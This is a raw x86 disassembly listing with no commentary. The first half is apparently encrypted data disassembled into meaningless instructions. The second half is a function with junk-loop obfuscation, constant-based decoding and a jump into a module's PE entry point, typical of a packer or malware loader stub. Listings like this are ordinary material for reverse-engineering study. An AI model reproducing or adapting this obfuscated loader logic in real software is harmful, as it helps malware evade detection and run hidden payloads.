  408d42:	push   ss
  408d43:	jns    0x408dc3
  408d45:	int    0x55
  408d47:	cdq    
  408d48:	div    DWORD PTR [eax+0x600c1ce7]
  408d4e:	ds xor eax,0xe57bb668
  408d54:	and    eax,0x9eeccff5
  408d59:	mov    bl,0xb3
  408d5b:	cmp    BYTE PTR [ebp+0x63],ah
  408d5e:	push   eax
  408d5f:	push   eax
  408d60:	cmp    BYTE PTR [edi-0x12],dh
  408d63:	mov    esp,0x95a1d2e0
  408d68:	leave  
  408d69:	mov    cl,0xe4
  408d6b:	jo     0x408d21
  408d6d:	je     0x408d1c
  408d6f:	mov    dh,0x50
  408d71:	xchg   ebp,eax
  408d72:	push   esi
  408d73:	imul   edx,DWORD PTR [eax],0x3363fed
  408d79:	xlat   BYTE PTR ds:[ebx]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	xchg   bh,ch
  408dac:	fldenv [edi-0x4f]
  408daf:	sar    DWORD PTR [esi+0x7e],1
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408e0a
  408db7:	xor    DWORD PTR [ecx-0x69],esp
  408dba:	mov    DWORD PTR [esi+0x0],0x474e3bf0
  408dc1:	mov    cl,0xc
  408dc3:	xor    eax,0x2172e0b3
  408dc8:	mov    ds,ebp
  408dca:	fsub   st,st(6)
  408dcc:	je     0x408e1b
  408dce:	xchg   ebx,eax
  408dcf:	dec    eax
  408dd0:	cli    
  408dd1:	dec    edx
  408dd2:	ficom  DWORD PTR [ebp+0x61652e91]
  408dd8:	ds (bad) 
  408dda:	jnp    0x408e2b
  408ddc:	add    BYTE PTR [esi+0x595c63ae],0xee
  408de3:	out    dx,eax
  408de4:	mov    bh,0x9b
  408de7:	add    eax,0x3fc8be6
  408dec:	mov    BYTE PTR [ebp-0x1e1a60f8],bl
  408df2:	je     0x408e34
  408df4:	fcomp  QWORD PTR [esi]
  408df6:	ret    0xa2ba
  408df9:	mov    ds:0xcd43d471,eax
  408dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dff:	call   0xe2f63376
  408e04:	cmc    
  408e05:	(bad)  
  408e06:	jns    0x408e6b
  408e08:	daa    
  408e09:	xchg   esp,eax
  408e0a:	je     0x408e3f
  408e0c:	sar    edi,1
  408e0e:	or     al,BYTE PTR [edx-0x1]
  408e11:	aaa    
  408e12:	xlat   BYTE PTR ds:[ebx]
  408e13:	in     al,0x30
  408e15:	(bad)  
  408e16:	mov    esi,0x80c95a8c
  408e1b:	in     al,0x63
  408e1d:	daa    
  408e1e:	js     0x408e15
  408e20:	das    
  408e21:	push   0xf
  408e23:	icebp  
  408e24:	adc    al,ch
  408e26:	sbb    eax,0xe927bc2d
  408e2b:	push   ss
  408e2c:	cmp    BYTE PTR [edx+0x48567f24],ch
  408e32:	jp     0x408e94
  408e34:	loop   0x408dee
  408e36:	iret   
  408e37:	jb     0x408e98
  408e39:	fld    TBYTE PTR [ebx]
  408e3b:	and    BYTE PTR [esi+eiz*2+0x74],al
  408e3f:	push   0xfd0e4e6f
  408e44:	xchg   esi,eax
  408e45:	pop    esi
  408e46:	mov    ecx,0x8f4058fd
  408e4b:	ins    DWORD PTR es:[edi],dx
  408e4c:	sbb    ecx,DWORD PTR [esi+0x46]
  408e4f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e51:	mov    dl,BYTE PTR [edi]
  408e53:	mov    ds:0xdf92350b,al
  408e58:	leave  
  408e59:	xchg   ebp,eax
  408e5a:	mov    ecx,0x6a18a440
  408e5f:	aam    0xb8
  408e61:	std    
  408e62:	aas    
  408e63:	aad    0xe3
  408e65:	out    dx,al
  408e66:	cmp    al,0x85
  408e68:	(bad)  
  408e69:	repz pushf 
  408e6b:	mov    dh,0xf1
  408e6d:	sbb    al,BYTE PTR [eax]
  408e6f:	push   ecx
  408e70:	cs dec edi
  408e72:	or     bl,dh
  408e74:	daa    
  408e75:	mov    dl,0x8d
  408e77:	ret    0x3fd
  408e7a:	inc    esi
  408e7b:	bound  edx,QWORD PTR [eax+0x37]
  408e7e:	test   al,0xfb
  408e80:	fldenv [edx-0x37]
  408e83:	neg    BYTE PTR [esi+0x464e30a8]
  408e89:	xchg   BYTE PTR [ebx],bh
  408e8b:	leave  
  408e8c:	cmp    BYTE PTR [esi],0x27
  408e8f:	sbb    DWORD PTR [edi],ebp
  408e91:	pop    es
  408e92:	dec    edx
  408e93:	lods   al,BYTE PTR ds:[esi]
  408e94:	repz push ss
  408e96:	or     al,0xb1
  408e98:	pop    edx
  408e99:	adc    BYTE PTR [edi],cl
  408e9b:	es inc eax
  408e9d:	inc    ecx
  408e9e:	mov    esp,0x64c243bb
  408ea3:	out    dx,al
  408ea4:	idiv   BYTE PTR [edi]
  408ea6:	and    DWORD PTR [esi],edi
  408ea8:	fucomip st,st(6)
  408eaa:	fs cmp esp,0xffffff88
  408eae:	je     0x408ede
  408eb0:	popa   
  408eb1:	push   0xe
  408eb3:	sti    
  408eb4:	int    0x21
  408eb6:	aam    0x9c
  408eb8:	or     al,0x27
  408eba:	out    0xbb,eax
  408ebc:	pop    ecx
  408ebd:	push   ecx
  408ebe:	inc    esp
  408ebf:	das    
  408ec0:	dec    edi
  408ec1:	sar    DWORD PTR [ecx],0xe6
  408ec4:	ret    0x8c33
  408ec7:	retf   
  408ec8:	or     al,BYTE PTR [ebx-0x3ed9e1c6]
  408ece:	int    0xce
  408ed0:	mov    ebp,0x3178ddfb
  408ed5:	add    DWORD PTR [edx],0xfffffff1
  408ed8:	mov    bh,BYTE PTR [esi-0x11]
  408edb:	cmp    bl,bl
  408edd:	add    edx,DWORD PTR [esi+0x4de36841]
  408ee3:	cmp    al,0xe0
  408ee5:	and    ebp,DWORD PTR [edi]
  408ee7:	add    DWORD PTR [ecx-0x75],esi
  408eea:	jae    0x408f1b
  408eec:	and    al,0xf9
  408eee:	das    
  408eef:	dec    edi
  408ef0:	push   edx
  408ef1:	sar    BYTE PTR [eax-0x2b],1
  408ef4:	xor    al,0xe5
  408ef6:	add    DWORD PTR ds:0xd3c90ba0,esp
  408efc:	jno    0x408eaa
  408efe:	fisub  DWORD PTR [ebp-0x11]
  408f01:	push   es
  408f02:	(bad)  
  408f03:	push   ecx
  408f04:	daa    
  408f05:	inc    ecx
  408f06:	xchg   ebx,eax
  408f07:	fwait
  408f08:	jne    0x408f61
  408f0a:	sti    
  408f0b:	push   ecx
  408f0c:	push   0xcd7afd11
  408f11:	ss stos BYTE PTR es:[edi],al
  408f13:	sub    al,0x2e
  408f15:	shl    edi,cl
  408f17:	inc    edx
  408f18:	nop
  408f19:	stc    
  408f1a:	fwait
  408f1b:	lahf   
  408f1c:	es jbe 0x408efc
  408f1f:	shl    BYTE PTR [edi+0x2f8035f7],cl
  408f25:	rcr    BYTE PTR [edi+0x11],cl
  408f28:	aas    
  408f29:	aad    0xf1
  408f2b:	or     cl,BYTE PTR [eax+0x51]
  408f2e:	cmc    
  408f2f:	or     al,0x34
  408f31:	call   0xf980:0x603e8534
  408f38:	fsubr  st,st(1)
  408f3a:	xor    bh,BYTE PTR [ebx+0xb]
  408f3d:	xchg   BYTE PTR [ecx+0x10],ah
  408f40:	idiv   BYTE PTR [ebp+0x12]
  408f43:	and    edx,DWORD PTR [edi+edx*1+0xa]
  408f47:	push   ebp
  408f48:	retf   0x8b09
  408f4b:	pop    ebp
  408f4c:	clc    
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f61:	jb     0x408fa3
  408f63:	(bad)  
  408f65:	fistp  QWORD PTR [esi+0x7e]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408f08
  408f6d:	push   ss
  408f6e:	dec    edi
  408f6f:	push   esp
  408f70:	repnz add DWORD PTR [ebx+0x32c009d3],0xffffffeb
  408f78:	and    BYTE PTR [edx-0x79],al
  408f7b:	xchg   ebp,eax
  408f7c:	and    cl,0x6e
  408f7f:	out    dx,eax
  408f80:	jl     0x408f2a
  408f82:	fnstsw ax
  408f84:	jmp    0xd9aeb7f4
  408f89:	outs   dx,DWORD PTR ds:[esi]
  408f8a:	repz inc edi
  408f8c:	fdivr  DWORD PTR [edi]
  408f8e:	jecxz  0x408f5c
  408f90:	mov    ecx,0xcb08973
  408f95:	add    cl,cl
  408f97:	mov    ds:0x83db924f,al
  408f9c:	or     eax,0xba1a5546
  408fa1:	jns    0x408ff0
  408fa3:	idiv   DWORD PTR ds:0x5613a799
  408fa9:	push   edi
  408faa:	nop
  408fab:	test   eax,0x3548205c
  408fb0:	daa    
  408fb1:	sub    DWORD PTR [ebx],edi
  408fb3:	cmp    BYTE PTR [ebp+0x2086e467],bl
  408fb9:	aam    0xa8
  408fbb:	push   ecx
  408fbc:	sti    
  408fbd:	std    
  408fbe:	jae    0x409006
  408fc0:	mov    dh,0xc5
  408fc2:	rcl    BYTE PTR [edi-0x7e68f523],cl
  408fc8:	out    0xc5,eax
  408fca:	sbb    al,0x87
  408fcc:	sahf   
  408fcd:	in     al,0xe9
  408fcf:	popa   
  408fd0:	(bad)  
  408fd2:	adc    edi,DWORD PTR [ecx+0x63]
  408fd5:	shl    DWORD PTR [edx-0x38e5b1d9],1
  408fdb:	aad    0x52
  408fdd:	xchg   DWORD PTR [edx+edx*8+0x3c3fc2d3],ebp
  408fe4:	(bad)  [eax-0x629dd4b9]
  408fea:	std    
  408feb:	retf   0x5825
  408fee:	outs   dx,DWORD PTR ds:[esi]
  408fef:	fcomp  st(2)
  408ff1:	fstp   QWORD PTR [edx+0x6e20d921]
  408ff7:	add    eax,0x1f71dfd3
  408ffc:	es loopne 0x409050
  408fff:	dec    ebx
  409000:	mov    ebx,0x1cb2e053
  409005:	call   0x1921f825
  40900a:	or     DWORD PTR [edx-0x3b4982ea],0x93574a6b
  409014:	mov    ah,0x4f
  409016:	lahf   
  409017:	xor    dl,BYTE PTR [ebp-0x11]
  40901a:	push   esp
  40901b:	sbb    cl,dl
  40901d:	pop    esp
  40901e:	nop
  40901f:	arpl   WORD PTR [ebp+0x6],ax
  409022:	ins    BYTE PTR es:[edi],dx
  409023:	lahf   
  409024:	arpl   sp,sp
  409026:	popa   
  409027:	mov    esi,0xa121cb94
  40902c:	mov    eax,0x6aa97c43
  409031:	enter  0x8aff,0x54
  409035:	add    DWORD PTR [ecx],edx
  409037:	imul   esi,DWORD PTR fs:[ebx+0x23],0xffffffba
  40903c:	aam    0x38
  40903e:	pop    edi
  40903f:	mov    BYTE PTR [ebp+0x25801bd7],bh
  409045:	ret    0x840b
  409048:	and    esi,DWORD PTR [edi+0x5c]
  40904b:	mov    al,0x69
  40904d:	call   0x80dc:0x9ad6c3ff
  409054:	cmp    BYTE PTR [eax-0x1f],dh
  409057:	in     al,dx
  409058:	retf   
  409059:	pop    ds
  40905a:	std    
  40905b:	loop   0x408ffd
  40905d:	loop   0x4090bb
  40905f:	(bad)  
  409060:	aam    0x2a
  409062:	rcl    DWORD PTR [ebp-0x32dcfe54],1
  409068:	loope  0x40909c
  40906a:	adc    esp,DWORD PTR [ebp+ebx*4-0x4c103323]
  409071:	sub    al,0x3e
  409073:	call   0x51ce:0xb697b431
  40907a:	pop    edi
  40907b:	loop   0x4090d2
  40907d:	out    0x7b,al
  40907f:	mov    dl,0xc9
  409081:	in     eax,dx
  409082:	and    al,0x6d
  409084:	in     eax,dx
  409085:	push   edx
  409087:	or     DWORD PTR [ebp+0x4],0x2e
  40908b:	fwait
  40908c:	cmp    eax,0xdc053b4d
  409091:	inc    edx
  409092:	(bad)  
  409093:	and    al,0x2b
  409095:	pop    DWORD PTR [ebx-0xa]
  409098:	or     eax,0xe518abb2
  40909d:	jmp    0x409117
  40909f:	mov    ebx,0xa56983ea
  4090a4:	outs   dx,DWORD PTR ds:[esi]
  4090a5:	enter  0x250d,0x22
  4090a9:	xchg   esi,eax
  4090aa:	push   ds
  4090ab:	cdq    
  4090ac:	xchg   edx,eax
  4090ad:	mov    eax,0x97d1bbb3
  4090b2:	loope  0x409048
  4090b4:	xchg   edx,eax
  4090b5:	sub    esp,DWORD PTR [ebx+edx*2-0x23768c7a]
  4090bc:	ds inc esi
  4090be:	data16 cli 
  4090c0:	inc    esi
  4090c1:	in     al,dx
  4090c2:	sub    eax,esi
  4090c4:	cld    
  4090c5:	push   esi
  4090c6:	imul   edi,DWORD PTR [ebp-0x1a233d53],0x62893f6e
  4090d0:	gs popf 
  4090d2:	inc    eax
  4090d3:	mov    eax,ds:0x4211d376
  4090d8:	or     BYTE PTR [edx+0x3a],cl
  4090db:	imul   cl
  4090dd:	sub    DWORD PTR ds:0x56798c8a,ecx
  4090e3:	outs   dx,BYTE PTR ds:[esi]
  4090e4:	xor    BYTE PTR [ebx-0x697b1082],dl
  4090ea:	sub    BYTE PTR [esi+0x1b01345],bh
  4090f0:	jmp    0xaf31:0x5544f913
  4090f7:	dec    esi
  4090f8:	jns    0x409097
  4090fa:	xlat   BYTE PTR ds:[ebx]
  4090fb:	fist   DWORD PTR ss:[esi+edx*4+0xfd10327]
  409103:	scas   eax,DWORD PTR es:[edi]
  409104:	sar    DWORD PTR [ebx],cl
  409106:	xlat   BYTE PTR ds:[ebx]
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
